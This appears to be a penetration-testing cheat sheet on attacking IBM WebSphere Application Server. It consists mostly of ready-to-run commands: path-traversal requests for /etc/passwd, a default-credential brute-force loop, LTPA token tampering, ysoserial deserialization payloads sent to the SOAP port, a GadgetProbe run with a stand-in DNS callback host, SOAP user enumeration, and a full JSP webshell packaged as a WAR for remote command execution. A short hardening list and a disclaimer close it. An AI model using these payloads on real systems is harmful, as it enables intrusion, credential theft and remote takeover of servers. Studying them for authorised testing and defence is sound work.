---
title: "IBM WebSphere Application Server"
date: 2026-02-24
draft: false
---

## Overview

IBM WebSphere Application Server (WAS) is an enterprise Java EE application server widely deployed in large financial institutions, insurance companies, and government agencies. It is frequently found in legacy environments running outdated versions. WebSphere's administrative console, SOAP-based management interface, and complex deployment history have produced numerous security vulnerabilities including path traversal, authentication bypass, SOAP deserialization, and SSRF.

**Default Ports:**
| Port | Service |
|------|---------|
| 9060 | WAS Admin Console (HTTP) |
| 9043 | WAS Admin Console (HTTPS) |
| 9080 | Application HTTP |
| 9443 | Application HTTPS |
| 8880 | SOAP management port |
| 8879 | RMI port (alternative/complement to 8880 SOAP) |
| 2809 | IIOP bootstrap |
| 9353 | SIB service integration bus |
| 7276 | High Availability Manager |
| 9810 | Node Agent bootstrap port (clustered/ND environments) |

---

## Recon and Fingerprinting

```bash
nmap -sV -p 9060,9043,9080,9443,8880 TARGET_IP
nmap -p 9080 --script http-title,http-headers TARGET_IP

# Admin console discovery
curl -sv http://TARGET_IP:9060/ibm/console/ 2>&1 | grep -iE "websphere|ibm|console"
curl -sv https://TARGET_IP:9043/ibm/console/ -k 2>&1 | grep -iE "websphere|ibm|console"

# Version from error pages
curl -s http://TARGET_IP:9080/nonexistent_$(date +%s) | grep -i websphere

# HTTP headers
curl -I http://TARGET_IP:9080/
```

### Version Detection Endpoints

```bash
# SOAP management API — get version
curl -s -k "https://TARGET_IP:8880/ibm/console/secure/isAlive.jsp"

# IBM console status
curl -s -k "https://TARGET_IP:9043/ibm/console/login.do"

# Admin console
for port in 9060 9043; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET_IP:$port/ibm/console/")
  echo "Port $port: $CODE"
done

# IBMWebAS server header
curl -s -I http://TARGET_IP:9080/ | grep -i "ibm\|websphere"
```

---

## CVE-2020-4534 — Path Traversal

**CVSS:** 6.1 Medium
**Affected:** IBM WebSphere Application Server 7.0, 8.0, 8.5, 9.0 (before specific fix packs)
**Type:** Path traversal / open redirect
**CWE:** CWE-22

### Vulnerability Details

WebSphere Application Server was vulnerable to a path traversal attack in the administrative console when processing file paths. An attacker could use `..%2f` or similar encoded traversal sequences in URLs to access files outside the intended directory context.

**Important prerequisite:** This CVE specifically affects the **UDDI Registry** component of WebSphere. UDDI is NOT installed by default in newer "Base" WAS installations. If the target is a Base install without the UDDI feature pack, the PoC will return 404 or 400 — not because it is patched, but because the vulnerable component is not present. Verify UDDI presence before concluding exploitability:

```bash
# Check if UDDI is installed
curl -sk "https://TARGET_IP:9443/uddiexplorer/" | grep -i "uddi"
curl -sk "https://TARGET_IP:9080/uddiexplorer/" | grep -i "uddi"
# 200 response with UDDI content = UDDI installed and potentially vulnerable
```

### PoC

```bash
# Basic traversal
curl -sv "http://TARGET_IP:9080/..%2f..%2f..%2fetc/passwd"
curl -sv "http://TARGET_IP:9080/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
curl -sv "http://TARGET_IP:9060/ibm/console/..%2f..%2f..%2fetc/passwd"

# WEB-INF access
curl -sv "http://TARGET_IP:9080/..%2f..%2fWEB-INF/web.xml"
curl -sv "http://TARGET_IP:9080/%2e%2e/%2e%2e/WEB-INF/web.xml"

# Admin console paths
curl -sk "https://TARGET_IP:9043/ibm/console/..%2f..%2f..%2fetc/passwd"

# Various encoding attempts
for enc in "..%2f" "%2e%2e%2f" "..%252f" "%252e%252e%252f" "..%5c" "..%255c"; do
  URL="http://TARGET_IP:9080/${enc}${enc}${enc}etc/passwd"
  CODE=$(curl -s -o /tmp/was_test -w "%{http_code}" "$URL")
  if [[ "$CODE" == "200" ]]; then
    SIZE=$(wc -c < /tmp/was_test)
    echo "[+] HIT: $URL ($SIZE bytes)"
    head -5 /tmp/was_test
  fi
done
```

---

## CVE-2022-22476 — Authentication Bypass

**CVSS:** 8.8 High
**Affected:** IBM WebSphere Application Server 9.0.5.0 to 9.0.5.12, 8.5.5.19, 8.0.0.15, Liberty 22.0.0.5 and earlier
**Type:** Identity spoofing / authentication bypass via LTPA token manipulation
**CWE:** CWE-287

### Vulnerability Details

WebSphere's LTPA (Lightweight Third-Party Authentication) token processing was vulnerable to identity spoofing. Under specific configurations using the OpenID Connect (OIDC) feature, a crafted request could cause WebSphere to authenticate the user as a different identity, bypassing authentication and potentially gaining admin access.

### Testing for the Vulnerability

```bash
# Check if OIDC is configured — correct endpoints:
# Traditional WAS (full profile)
curl -sk "https://TARGET_IP:9443/oidc/endpoint/default/token" | grep -i "oidc\|error\|token"

# Liberty profile
curl -sk "https://TARGET_IP:9443/ibm/api/v1/auth/token" | grep -i "oidc\|error\|token"

# Note: /oidcclient/ is a sample application path, NOT the OIDC provider endpoint
# It may or may not be present and does not confirm OIDC is configured

# Check LTPA cookie handling
curl -sv -k "https://TARGET_IP:9443/app/" 2>&1 | grep -i "ltpa\|ltpatoken"

# Try with manipulated LTPA token
ORIGINAL_COOKIE="LtpaToken2=<captured_token>"
MODIFIED_COOKIE="LtpaToken2=<manipulated_token>"
curl -sk -H "Cookie: $MODIFIED_COOKIE" "https://TARGET_IP:9443/ibm/console/secure/" | grep -i "welcome\|admin"
```

---

## CVE-2023-38267 — Information Disclosure via Admin Console

**CVSS:** 5.3 Medium
**Affected:** IBM WebSphere Application Server 9.0, 8.5, Liberty
**Type:** Information disclosure
**CWE:** CWE-200

```bash
# Check for exposed configuration details
curl -sk "https://TARGET_IP:9043/ibm/console/secure/logoutExitPage.jsp"

# Check for session-related info disclosure
curl -sk "https://TARGET_IP:9043/ibm/console/login.do?action=secure" | grep -i version

# Server status page
curl -s http://TARGET_IP:9080/snoop/
curl -s http://TARGET_IP:9080/HelloWorld/

# Default sample applications (may be present on dev/staging)
for app in "snoop" "hello" "HitCount" "HelloHTMLError" "PlantsByWebSphere"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://TARGET_IP:9080/$app/")
  echo "$CODE : /$app/"
done
```

---

## Admin Console Enumeration

```bash
# Admin console login
curl -sv -k -c /tmp/was_cookies.txt \
  --data "j_username=wsadmin&j_password=wsadmin&action=Login" \
  "https://TARGET_IP:9043/ibm/console/j_security_check"

# Default credentials to try
for cred in "wsadmin:wsadmin" "admin:admin" "was:was" "system:manager" "admin:password1" "admin:WebAS"; do
  user=$(echo $cred | cut -d: -f1)
  pass=$(echo $cred | cut -d: -f2)
  RESULT=$(curl -sk -o /tmp/was_login -w "%{http_code}" \
    -c /tmp/was_cookie_${user}.txt \
    -b /tmp/was_cookie_${user}.txt \
    --data "j_username=$user&j_password=$pass&action=Login" \
    "https://TARGET_IP:9043/ibm/console/j_security_check" \
    -L)
  # Check redirect destination
  if grep -q "securelogin\|secure/" /tmp/was_login 2>/dev/null; then
    echo "[+] VALID: $cred"
  else
    echo "[-] $cred -> $RESULT"
  fi
done
```

---

## SOAP Management Interface Abuse

WebSphere's SOAP connector on port 8880 exposes management operations via SOAP/HTTP:

```bash
# Check SOAP connector
curl -s http://TARGET_IP:8880/

# WSDL enumeration
curl -s "http://TARGET_IP:8880/management?wsdl"

# Version via SOAP
curl -s -X POST "http://TARGET_IP:8880/IBMWebServices" \
  -H "Content-Type: text/xml;charset=UTF-8" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header/>
  <soapenv:Body>
    <getVersion/>
  </soapenv:Body>
</soapenv:Envelope>'
```

### SOAP Deserialization

WebSphere's SOAP management interface has historically been vulnerable to deserialization. The attack vector is similar to other Java application servers: sending a crafted SOAP message containing a malicious serialized Java object.

```bash
# Generate ysoserial payload targeting WebSphere classes
java -jar ysoserial-all.jar IBM_MQ_Sink "id > /tmp/was_rce.txt" > /tmp/was_soap.ser

# If IBM-specific gadget not available, try standard chains
for gadget in CommonsCollections1 CommonsCollections6 Spring1 CommonsBeanutils1; do
  java -jar ysoserial-all.jar $gadget "id > /tmp/${gadget}_rce.txt" > /tmp/${gadget}.ser
done
```

---

## wssat — WebSphere Security Assessment Tool

```bash
# Install
git clone https://github.com/HannahLaw-ICF/wssat
cd wssat

# Basic scan
python3 wssat.py -u "http://TARGET_IP:9080" -a

# Scan with authentication
python3 wssat.py -u "http://TARGET_IP:9080" --user wsadmin --pass wsadmin

# Specific checks
python3 wssat.py -u "http://TARGET_IP:9080" --snoop --sample-apps --default-creds
```

---

## Sensitive Paths and Configuration Files

```bash
# Application configuration locations
PATHS=(
  "/snoop/"
  "/ivtApp/"
  "/HelloWorld/"
  "/PlantsByWebSphere/"
  "/console/"
  "/ibm/console/"
  "/.well-known/"
  "/WEB-INF/web.xml"
  "/WEB-INF/ibm-web-ext.xml"
  "/WEB-INF/ibm-application-bnd.xml"
)

for path in "${PATHS[@]}"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET_IP:9443$path")
  echo "$CODE : $path"
done
```

---

## Post-Authentication — Application Deployment

If admin console access is obtained, WAR/EAR deployment can achieve RCE:

```bash
# After logging into admin console:
# Navigate to: Applications → New Application → New Enterprise Application
# Upload a malicious WAR file with a JSP webshell

# Create webshell WAR
mkdir -p /tmp/was_shell/WEB-INF
cat > /tmp/was_shell/shell.jsp << 'EOF'
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    StringBuilder sb = new StringBuilder();
    String line;
    while((line=br.readLine())!=null) sb.append(line).append("\n");
    out.println("<pre>"+sb+"</pre>");
}
%>
EOF

cat > /tmp/was_shell/WEB-INF/web.xml << 'EOF'
<?xml version="1.0"?>
<web-app xmlns="http://java.sun.com/xml/ns/javaee" version="2.5">
  <display-name>shell</display-name>
</web-app>
EOF

# Package as WAR
cd /tmp/was_shell && jar -cvf /tmp/shell.war .

# Access after deployment
curl "http://TARGET_IP:9080/shell/shell.jsp?cmd=id"
```

---

## Liberty Profile — Additional Attack Surface

WebSphere Liberty Profile is a lightweight version with a different configuration model:

```bash
# Liberty admin center
curl -sk "https://TARGET_IP:9443/adminCenter/" | grep -i "liberty\|ibm"

# Check server.xml (may be accessible if misconfigured)
curl -s "http://TARGET_IP:9080/server.xml"
curl -s "http://TARGET_IP:9080/bootstrap.properties"

# Liberty-specific endpoints
for path in "/health" "/metrics" "/openapi" "/openapi/ui" "/ibm/api/explorer" "/ibm/api/discovery"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET_IP:9443$path")
  echo "$CODE : $path"
done
```

---

## JEP 290 Deserialization Filter Bypass

JEP 290 (Java serialization filter) is active in most modern WAS instances (9.0.5.6+). It blocks deserialization of classes that are not on the whitelist, breaking standard ysoserial gadget chains (CommonsCollections, etc.). To exploit deserialization on a JEP 290-protected WAS:

**Approach:** Use IBM-specific or WAS-bundled gadget chains that operate within the whitelist:

- `CommonsBeanutils2` — may be whitelisted if the application uses Apache Commons BeanUtils
- Internal WebSphere classes: `com.ibm.ws.cache.Cache` and related classes from the WAS runtime have been used in IBM-specific gadget chains
- Use **GadgetProbe** to identify which classes are available in the target's classpath before committing to a gadget chain

```bash
# GadgetProbe — identifies available gadget chain classes via deserialization response timing
git clone https://github.com/BishopFox/GadgetProbe.git
cd GadgetProbe

# Send probe payloads to WAS SOAP endpoint to determine available classes
# GadgetProbe encodes class names into serialized objects; differences in
# error responses reveal which classes are on the classpath

# Build probe payloads
java -jar GadgetProbe.jar wordlist.txt dnscallback.example.com

# Send to WAS SOAP endpoint
for payload in probes/*.ser; do
  curl -s -X POST http://TARGET_IP:8880/IBMWebServices \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-binary @"$payload"
done

# After identifying available classes, generate targeted ysoserial payload
java -jar ysoserial-all.jar CommonsBeanutils2 "id > /tmp/rce.txt" > /tmp/payload.ser
curl -s -X POST http://TARGET_IP:8880/IBMWebServices \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary @/tmp/payload.ser
```

---

## Liberty MicroProfile Health and Metrics Endpoints

WebSphere Liberty deployments using MicroProfile often expose health and metrics endpoints that can leak internal service details, database connection pool names, query patterns, and infrastructure topology.

```bash
# MicroProfile Health endpoint — service status and dependencies
curl -sk "https://TARGET_IP:9443/health"
curl -sk "https://TARGET_IP:9443/health/live"
curl -sk "https://TARGET_IP:9443/health/ready"

# MicroProfile Metrics — Prometheus-format metrics
# May expose database table names, query execution counts, connection pool stats
curl -sk "https://TARGET_IP:9443/metrics"
curl -sk "https://TARGET_IP:9443/metrics/application"
curl -sk "https://TARGET_IP:9443/metrics/base"
curl -sk "https://TARGET_IP:9443/metrics/vendor"

# OpenAPI / Swagger UI — exposes all REST API endpoints and schemas
curl -sk "https://TARGET_IP:9443/openapi"
curl -sk "https://TARGET_IP:9443/openapi/ui"

# IBM API Discovery
curl -sk "https://TARGET_IP:9443/ibm/api/explorer"
curl -sk "https://TARGET_IP:9443/ibm/api/discovery"
```

The `/metrics` endpoint is particularly valuable: it may expose database table names derived from query metrics, JPA entity names, EJB component names, and connection pool identifiers — all useful for mapping the application's internal structure during post-exploitation.

---

## CVE-2021-29842 — Information Disclosure via SOAP (User Enumeration)

**CVSS:** 5.3 Medium
**Affected:** IBM WebSphere Application Server 7.0, 8.0, 8.5, 9.0 (specific fix pack levels)
**Type:** OS/LDAP user enumeration via SOAP interface without full authentication
**CWE:** CWE-203

### Vulnerability Details

The SOAP-based administrative interface leaked distinguishable error messages when a valid vs. invalid OS or LDAP username was provided. An unauthenticated or partially-authenticated attacker could enumerate valid OS or LDAP usernames by sending SOAP requests and observing the response differences, without completing full authentication.

### SOAP Request PoC

```bash
# Probe for user existence via SOAP — observe response differences
# Valid user: specific error about password/credentials
# Invalid user: generic "user not found" or different SOAP fault

curl -s -X POST "http://TARGET_IP:8880/IBMWebServices" \
  -H "Content-Type: text/xml;charset=UTF-8" \
  -H "SOAPAction: \"\"" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
  <soapenv:Header>
    <wsse:Security>
      <wsse:UsernameToken>
        <wsse:Username>admin</wsse:Username>
        <wsse:Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText">wrongpassword</wsse:Password>
      </wsse:UsernameToken>
    </wsse:Security>
  </soapenv:Header>
  <soapenv:Body>
    <getVersion/>
  </soapenv:Body>
</soapenv:Envelope>' 2>&1 | grep -iE "fault|error|invalid|reason"

# Compare response for a non-existent user
curl -s -X POST "http://TARGET_IP:8880/IBMWebServices" \
  -H "Content-Type: text/xml;charset=UTF-8" \
  -H "SOAPAction: \"\"" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
  <soapenv:Header>
    <wsse:Security>
      <wsse:UsernameToken>
        <wsse:Username>nonexistentuser12345</wsse:Username>
        <wsse:Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText">wrongpassword</wsse:Password>
      </wsse:UsernameToken>
    </wsse:Security>
  </soapenv:Header>
  <soapenv:Body>
    <getVersion/>
  </soapenv:Body>
</soapenv:Envelope>' 2>&1 | grep -iE "fault|error|invalid|reason"
```

Differing SOAP fault codes or messages between the two responses indicate user enumeration is possible. Use a wordlist of common OS/LDAP usernames and script the comparison.

**Affected versions and patch:** Apply IBM Security Bulletin for CVE-2021-29842. Fix packs: WAS 9.0.5.8+, 8.5.5.21+. Check IBM's bulletin at https://www.ibm.com/support/pages/node/6455991 for exact fix pack levels.

---

## Hardening Recommendations

- Apply IBM Security Bulletins and fix packs regularly
- Change all default credentials (wsadmin, admin accounts)
- Disable the administrative console on production application servers if not needed
- Use the Global Security Configuration Wizard to harden settings
- Enable SSL for all communication (disable HTTP for admin console)
- Implement Java 2 Security to restrict application permissions
- Disable sample applications (snoop, ivtApp, HelloWorld, etc.)
- Restrict SOAP connector access to management IP ranges only
- Use IBM Security Guardium or equivalent for database activity monitoring
- Enable WebSphere's built-in audit logging (Administrative Event Notifications)
- Apply Java serialization filter (WebSphere 9.0.5.6+ supports JEP 290)
- Disable CORBA/IIOP if not required


---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.